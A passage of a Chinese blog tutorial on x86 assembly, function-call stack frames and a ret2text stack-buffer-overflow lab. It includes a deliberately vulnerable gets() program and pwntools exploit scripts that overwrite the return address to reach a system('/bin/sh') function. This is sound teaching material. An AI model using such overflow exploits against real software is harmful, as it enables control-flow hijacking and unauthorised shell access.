+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">JMP start        ; 跳转到标签 start 处继续执行<br></code></pre></td></tr></table></figure>
+
+<h5 id="2-CMP"><a href="#2-CMP" class="headerlink" title="2. CMP"></a>2. CMP</h5><p><code>CMP</code> 指令比较两个操作数，并根据结果设置标志寄存器。常与条件跳转指令（如 <code>JE</code>、<code>JNE</code>、<code>JG</code>、<code>JL</code> 等）配合使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">CMP AX, BX       ; 比较 AX 和 BX<br>JE equal         ; 如果 AX 等于 BX，跳转到 equal 标签<br>JNE notequal     ; 如果 AX 不等于 BX，跳转到 notequal 标签<br></code></pre></td></tr></table></figure>
+
+<p>常见的条件跳转指令：</p>
+<ul>
+<li><p><strong>JE</strong> &#x2F; <strong>JZ</strong>：等于 &#x2F; 零时跳转（Jump if Equal &#x2F; Zero）。</p>
+</li>
+<li><p><strong>JNE</strong> &#x2F; <strong>JNZ</strong>：不等于 &#x2F; 非零时跳转（Jump if Not Equal &#x2F; Not Zero）。</p>
+</li>
+<li><p><strong>JG</strong> &#x2F; <strong>JNLE</strong>：大于时跳转（Jump if Greater）。</p>
+</li>
+<li><p><strong>JL</strong> &#x2F; <strong>JNGE</strong>：小于时跳转（Jump if Less）。</p>
+</li>
+<li><p><strong>JGE</strong>：大于等于时跳转（Jump if Greater or Equal）。</p>
+</li>
+<li><p><strong>JLE</strong>：小于等于时跳转（Jump if Less or Equal）。</p>
+</li>
+</ul>
+<h5 id="3-CALL-RET"><a href="#3-CALL-RET" class="headerlink" title="3. CALL &amp; RET"></a>3. CALL &amp; RET</h5><p>函数调用与返回指令</p>
+<p><code>CALL</code> 指令用于调用子程序，<code>RET</code> 指令用于从子程序返回。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">CALL func        ; 调用函数 func<br>RET              ; 从函数返回<br></code></pre></td></tr></table></figure>
+
+<h5 id="4-LOOP"><a href="#4-LOOP" class="headerlink" title="4. LOOP"></a>4. LOOP</h5><p>循环指令</p>
+<p><code>LOOP</code> 指令用于循环操作，依赖于 <code>CX</code> 或 <code>ECX</code> 寄存器的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV CX, 10       ; 将 10 赋值给 CX<br>loop_start:<br>    ; 循环体<br>    LOOP loop_start  ; CX = CX - 1，若 CX 不为 0，则跳转到 loop_start<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-2-5-位移指令"><a href="#3-2-5-位移指令" class="headerlink" title="3.2.5 位移指令"></a>3.2.5 位移指令</h4><h5 id="1-SHL-SAL"><a href="#1-SHL-SAL" class="headerlink" title="1. SHL &amp; SAL"></a>1. SHL &amp; SAL</h5><p>左移指令</p>
+<ul>
+<li><p><strong>SHL</strong>（Shift Logical Left）：逻辑左移，空出的位用 0 填充。</p>
+</li>
+<li><p><strong>SAL</strong>（Shift Arithmetic Left）：算术左移，与 SHL 相同。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SHL AX, 1        ; 将 AX 左移 1 位<br></code></pre></td></tr></table></figure>
+
+<h5 id="2-SHR-SAR"><a href="#2-SHR-SAR" class="headerlink" title="2. SHR&amp; SAR"></a>2. SHR&amp; SAR</h5><p>右移指令</p>
+<ul>
+<li><p><strong>SHR</strong>（Shift Logical Right）：逻辑右移，空出的位用 0 填充。</p>
+</li>
+<li><p><strong>SAR</strong>（Shift Arithmetic Right）：算术右移，符号位保持不变。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SHR AX, 1        ; 将 AX 右移 1 位<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-2-6-字符串操作指令"><a href="#3-2-6-字符串操作指令" class="headerlink" title="3.2.6 字符串操作指令"></a>3.2.6 字符串操作指令</h4><h5 id="1-MOVSB-MOVSW-MOVSD"><a href="#1-MOVSB-MOVSW-MOVSD" class="headerlink" title="1. MOVSB &#x2F; MOVSW &#x2F; MOVSD"></a>1. MOVSB &#x2F; MOVSW &#x2F; MOVSD</h5><p>字符串移动指令</p>
+<ul>
+<li><p><strong>MOVSB</strong>：字节传送。</p>
+</li>
+<li><p><strong>MOVSW</strong>：字传送。</p>
+</li>
+<li><p><strong>MOVSD</strong>：双字传送。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOVSB            ; 将 DS:SI 指向的字节传送到 ES:DI<br></code></pre></td></tr></table></figure>
+
+<h5 id="2-REP"><a href="#2-REP" class="headerlink" title="2. REP"></a>2. REP</h5><p>重复前缀指令</p>
+<p><code>REP</code> 指令用于重复执行字符串操作指令，直到 <code>CX</code> 寄存器的值为 0。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">REP MOVSB        ; 重复执行 MOVSB，直到 CX 为 0<br></code></pre></td></tr></table></figure>
+
+<h2 id="参考书籍与链接"><a href="#参考书籍与链接" class="headerlink" title="参考书籍与链接"></a>参考书籍与链接</h2><p><a target="_blank" rel="noopener" href="https://cankaoshouce.com/assembly/assembly-course.html">汇编语言 教程 | 参考手册 (cankaoshouce.com)</a></p>
+<p>汇编语言（第4版） (王爽)</p>
+<h2 id="Hello，World！"><a href="#Hello，World！" class="headerlink" title="Hello，World！"></a>Hello，World！</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section    .text<br>   global _start     ;必须为链接器(ld)声明<br>_start:                ;告诉链接器入口点<br>   mov    edx,len     ;消息长度<br>   mov    ecx,msg     ;写消息<br>   mov    ebx,1       ;文件描述符 (stdout)<br>   mov    eax,4       ;系统调用号 (sys_write)<br>   int    0x80        ;调用内核<br>   mov    eax,1       ;系统调用号 (sys_exit)<br>   int    0x80        ;调用内核<br>section    .data<br>msg db &#x27;Hello, World!&#x27;, 0xa  ;要打印的字符串<br>len equ $ - msg     ;字符串的长度<br></code></pre></td></tr></table></figure>
+
+<h1 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h1><h2 id="1-栈"><a href="#1-栈" class="headerlink" title="1. 栈"></a>1. 栈</h2><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p>
+<img src="/post/47670/1729407589581-9bd3884f-fd93-40c9-9c1f-b128b9f3e8ce-1735222654797-156.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>
+<h2 id="2-调用流程"><a href="#2-调用流程" class="headerlink" title="2. 调用流程"></a>2. 调用流程</h2><p>C语言例子</p>
+<p>main函数调用func_b函数，func_b函数调用func_a函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">func_a</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//do sth</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">func_b</span><span class="hljs-params">()</span>&#123;<br>    func_a();<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    func_b();<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-1-调用func-b函数"><a href="#2-1-调用func-b函数" class="headerlink" title="2.1 调用func_b函数"></a>2.1 调用func_b函数</h3><p>①当运行到call func_b时main函数的栈帧</p>
+<p>②RBP指向栈底，RSP指向栈顶</p>
+<p>③这段栈帧存放了一些main函数的局部变量</p>
+<p>④main函数要调用func_b，main只需要call func_b</p>
+<p>⑤也就是</p>
+<ul>
+<li>push rip;</li>
+<li>mov rip func_b;</li>
+</ul>
+<img src="/post/47670/1729407589643-4ff3aa18-9f1b-4c85-854a-89eb055f7528-1735222654797-157.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>①那么此时跳转到func_b继续执行，func_b直接执行主逻辑吗？</p>
+<p>②显然不是的，被调用函数func_b还需要维护栈帧。</p>
+<p>③具体来说，需要以下几步：</p>
+<ul>
+<li>push rbp;将调用函数的栈底指针保存。</li>
+<li>mov rbp, rsp;将栈底指针指向现在的栈顶。</li>
+<li>sub rsp, xxx;开辟被调用函数栈帧，此时上一步的rbp就是指向栈帧的底。</li>
+</ul>
+<h3 id="2-2-调用func-b函数完成"><a href="#2-2-调用func-b函数完成" class="headerlink" title="2.2 调用func_b函数完成"></a>2.2 调用func_b函数完成</h3><p>①func_b执行完维护栈帧操作后的栈布局</p>
+<p>②所谓栈帧的维护就是维护rbp和rsp两个指针</p>
+<p>③rsp永远指向栈顶</p>
+<p>④rbp用来定位局部变量</p>
+<img src="/post/47670/1729407589709-319cb89a-4336-4d0d-9b38-52fc237732eb-1735222654797-158.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="2-3-调用func-a函数"><a href="#2-3-调用func-a函数" class="headerlink" title="2.3 调用func_a函数"></a>2.3 调用func_a函数</h3><p>①现在，func_b函数要调用func_a函数，其调用流程与main函数调用func_b函数基本一致。</p>
+<p>②不同处在于返回地址、rbp和rsp指向的地址，以及开辟的栈空间的不同。</p>
+<h3 id="2-4-调用func-a函数完成"><a href="#2-4-调用func-a函数完成" class="headerlink" title="2.4 调用func_a函数完成"></a>2.4 调用func_a函数完成</h3><p>①func_b函数调用完func_a函数后的栈布局</p>
+<p>②至此，示例的函数已经调用完毕</p>
+<img src="/post/47670/1729407589770-93d11168-b99e-4f54-8b27-3e004fbfb31a-1735222654797-159.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>③至此，示例的函数调用已经完毕</p>
+<p>④现在，func_a执行完毕，要返回了</p>
+<p>⑤该如何维护栈帧呢？</p>
+<h3 id="2-5-leave指令"><a href="#2-5-leave指令" class="headerlink" title="2.5 leave指令"></a>2.5 leave指令</h3><p>①leave指令作用是维护栈帧，通常出现在函数的结尾，与ret连用</p>
+<p>②其实际作用为</p>
+<ul>
+<li>mov rsp, rbp;</li>
+<li>pop rbp;</li>
+</ul>
+<p>③将栈顶指针指向栈帧底部，然后在栈中弹出新的栈底指针</p>
+<h3 id="2-6-返回func-a函数"><a href="#2-6-返回func-a函数" class="headerlink" title="2.6 返回func_a函数"></a>2.6 返回func_a函数</h3><p>①在一个函数执行结束返回时，会执行leave; ret ;</p>
+<p>②实际效果就是：</p>
+<ul>
+<li>mov rsp rbp; 将栈顶指针指向现在的栈底</li>
+<li>pop rbp; 将保存的栈底指针弹出</li>
+<li>pop rip;执行下一条指令</li>
+</ul>
+<p>③func_a函数执行完毕返回后，栈布局如图：</p>
+<img src="/post/47670/1729407589862-0fe2b72b-cabf-4b1a-8e64-d77023632cd5-1735222654797-160.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>③可以与之前func_b函数未调用func_a函数前的栈帧对比</p>
+<p>④一模一样，说明已经恢复了栈帧</p>
+<p>⑤唯一不同处就在于此程序的rip已经指向了c&#x3D;1</p>
+<h3 id="2-7-返回func-b函数"><a href="#2-7-返回func-b函数" class="headerlink" title="2.7 返回func_b函数"></a>2.7 返回func_b函数</h3><p>①func_b函数执行完毕返回后，栈布局如图：</p>
+<img src="/post/47670/1729407589926-dcee0fed-773c-491e-b301-aee4d9265abe-1735222654797-161.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>在这之后，main函数继续执行，直到结束。</p>
+<h3 id="2-8函数调用流程总结"><a href="#2-8函数调用流程总结" class="headerlink" title="2.8函数调用流程总结"></a>2.8函数调用流程总结</h3><p>①调用函数：只需要将rip压栈，即push rip，然后将rip赋值为被调用函数的起始地址，这已操作被隐性的内置在call指令中。</p>
+<p>②被调用函数：push rbp; mov rbp rsp; sub rsp xxx。</p>
+<p>即保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间给自己用，此时就变成了被调用函数的栈底。</p>
+<p>③函数返回：leave; ret; 翻译过来就是：mov rsp rbp; pop rbp; pop rip; 即恢复栈帧，返回调用函数的返回地址。</p>
+<h2 id="3-调用约定"><a href="#3-调用约定" class="headerlink" title="3. 调用约定"></a>3. 调用约定</h2><p>函数返回值约定</p>
+<ul>
+<li>一般来说，一个函数的返回值会存储到RAX寄存器</li>
+</ul>
+<p>32位和64位程序参数调用约定</p>
+<ul>
+<li><p>x86</p>
+</li>
+<li><p><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</p>
+</li>
+<li><p>x64</p>
+</li>
+<li><p>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</p>
+</li>
+<li><p>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</p>
+</li>
+</ul>
+<h1 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux 环境中，二进制可执行文件的类型是（Executable and Linkable Format）文件。</p>
+<p>ELF 文件中包含许多个节(section)，各个节中存放不同的数据，这些节的信息存放在节头表中，主要包括</p>
+<img src="/post/47670/1729742376286-84aedbcd-5134-4fb1-9cdf-730607cd8fbc-1735222654797-162.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>在 ida 中按下 Ctrl+s，可以看到各个节的信息</p>
+<img src="/post/47670/1729742504846-f542b168-5048-4b5d-82b9-68bab938b6a6-1735222654797-163.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p>
+<ul>
+<li>程序必须向栈上写入数据。</li>
+<li>写入的数据大小没有被良好地控制。</li>
+</ul>
+<p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。</p>
+<h3 id="32-位程序"><a href="#32-位程序" class="headerlink" title="32 位程序"></a>32 位程序</h3><p>举个C语言例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">success</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Hava already controlled it.&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>];<br>    gets(s);<br>    <span class="hljs-built_in">puts</span>(s);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    vulnerable();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个程序的主要目的读取一个字符串，并将其输出。从代码中可以看出main函数调用了vulnerable函数，但main函数和vulnerable函数都没有调用success函数，<strong>我们假设success函数中puts语句输出的内容即为我们的flag，那我们就希望获得succes函数中的flag</strong>，应该怎样获取flag呢，请往下看</p>
+<p>使用以下命令编译程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -m32 -fno-stack-protector -no-pie pwn.c -o pwn32<br></code></pre></td></tr></table></figure>
+
+<img src="/post/47670/1729694599728-2e9a39e0-ea9a-4ee2-8320-b11b28f673e6-1735222654797-164.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出</p>
+<p>gcc 编译指令中，-m32 指的是生成 32 位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成 canary。 为了更加方便地介绍栈溢出的基本利用方式，使用-no-pie关闭 PIE（Position Independent Executable），避免加载基址被打乱。</p>
+<p>编译成功后，可以使用checksec检查编译的文件</p>
+<img src="/post/47670/1729694627992-6d9f5b2d-57fe-49e8-80ea-eab44841016d-1735222654797-165.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看vulnerable 函数</p>
+<img src="/post/47670/1729415597376-9ecc28cc-bd2b-4b61-b496-3a4ef0f2eb01-1735222654797-166.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">             +-----------------+<br>             |     retaddr     |<br>             +-----------------+<br>             |     saved ebp   |<br>      ebp---&gt;+-----------------+<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure>
+
+<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为0x8049196</p>
+<img src="/post/47670/1729694734686-0ee2abaf-3c57-4427-86e4-95672dad4fe2-1735222654797-167.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>那么如果我们读取的字符串为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span> + success_addr<br><span class="hljs-comment">#success_addr即为success函数地址</span><br></code></pre></td></tr></table></figure>
+
+<p>由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr（返回地址） 覆盖为 success_addr，即0x8049196，此时的栈结构为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">             +-----------------+<br>             |    0x08049186   |<br>             +-----------------+<br>             |       bbbb      |<br>      ebp---&gt;+-----------------+<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>             |                 |<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure>
+
+<p>编写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># 构造与程序交互的对象</span><br>p = process(<span class="hljs-string">&#x27;./pwn32&#x27;</span>)<br>success_addr = <span class="hljs-number">0x8049196</span><br><span class="hljs-comment"># 构造payload</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x14</span> + <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x4</span> + p32(success_addr)<br><span class="hljs-comment">#print(p32(success_addr))</span><br><span class="hljs-comment"># 向程序发送字符串</span><br>p.sendline(payload)<br><span class="hljs-comment"># 将代码交互转换为手动交互</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>运行 exp</p>
+<img src="/post/47670/1729694852185-efb75896-5f88-4f67-9afd-564d99a40397-1735222654797-168.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="64-位程序"><a href="#64-位程序" class="headerlink" title="64 位程序"></a>64 位程序</h3><p>C语言例子同上</p>
+<p>使用以下命令编译程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fno-stack-protector -no-pie pwn.c -o pwn64<br></code></pre></td></tr></table></figure>
+
+<img src="/post/47670/1729693237007-269ca430-7642-41d1-bbd0-c9421f4318f7-1735222654797-169.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>编译成功后，使用checksec检查编译的文件</p>
+<img src="/post/47670/1729693266402-63709752-4749-401c-967a-d0e6f7dac4ae-1735222654797-170.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>我们同样利用 IDA 来反编译一下二进制程序并查看vulnerable 函数，该字符串距离 rbp 的长度为 0xC</p>
+<img src="/post/47670/1729418446953-c66b8407-5364-40b8-8a80-9d2312b4bec1-1735222654797-171.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>如果我们同样按照 32 位程序的方法，将 success 函数的地址 0x401176 作为返回地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">success_addr = <span class="hljs-number">0x401176</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(success_addr)<br></code></pre></td></tr></table></figure>
+
+<img src="/post/47670/1729693421434-141797d8-5234-4d5d-843b-b4d74a352bd7-1735222654797-172.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>写出 exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./pwn64&#x27;</span>)<br><br>success_addr = <span class="hljs-number">0x401176</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(success_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>运行脚本后，发现并没有获取到命令行的控制权</p>
+<img src="/post/47670/1729695072591-d002a40f-a791-4ac4-8488-7ec354cbeaa9-1735222654797-173.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>那么究竟是什么原因导致没有获取到控制权，我们可以在脚本中加入调试语句，然后逐步调试寻找原因</p>
+<p>调试脚本，使用 attach 语句将断点下在 gets 函数即 0x4011BC 处</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./pwn64&#x27;</span>)<br><br>success_addr = <span class="hljs-number">0x401176</span><br><br>attach(p, <span class="hljs-string">&#x27;b *0x4011BC&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(success_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>输入 ni 指令回车</p>
+<img src="/post/47670/1729695670527-12e448a1-06a9-4ea8-a976-1d235c86c8d5-1735222654797-174.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>同时，我们关注汇编窗口，然后一直回车</p>
+<img src="/post/47670/1729695707477-e316e653-d8ce-4c86-a983-173f419efde0-1735222654797-175.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>当程序运行至 vulerable 函数处，我们可以放慢速度并观察程序运行情况</p>
+<img src="/post/47670/1729695828137-bcf5b41f-0836-4baf-89c6-16db12e603cd-1735222654797-176.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>当执行完 puts 函数之后可以看到程序打印了输入内容</p>
+<img src="/post/47670/1729696069104-9bbf445d-6904-4c9b-9619-97cb189a9447-1735222654797-177.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>继续回车，发现程序已经运行至 success 函数，执行完 puts 之后将内容打印</p>
+<img src="/post/47670/1729696160504-e8a73f85-de9c-4033-9c18-787bbb0dbee4-1735222654797-178.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>继续回车，当程序执行到 system 时注意观察</p>
+<img src="/post/47670/1729696280049-405101de-4a8c-404f-b557-4160fa1ecb79-1735222654797-179.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>回车之后，程序会跳入 do_system 函数执行</p>
+<img src="/post/47670/1729696357940-cd504cab-30fc-4019-bef6-6da0bdfe3299-1735222654798-180.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>再次回车之后发现程序并没有继续执行，这实际上是程序卡在了 movaps 指令上，这个指令涉及到 <code>xmm</code> 寄存器，该寄存器为128位，就要求 rsp 为 16 字节对齐。16字节对齐意味着 rsp 地址必须能够被16整除，即地址的最低4位（在二进制表示中）必须为0。</p>
+<p>那么应该怎样进行 16 字节对齐呢，具体方法就是跳过 success 函数中一条栈指令即 push rbp ，减少⼀次对栈的操作，然后选用 0x40117B 作为返回地址。</p>
+<img src="/post/47670/1729697167631-257581c7-6a3b-4d5a-a77d-9425dd79676f-1735222654798-181.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>exp</p>
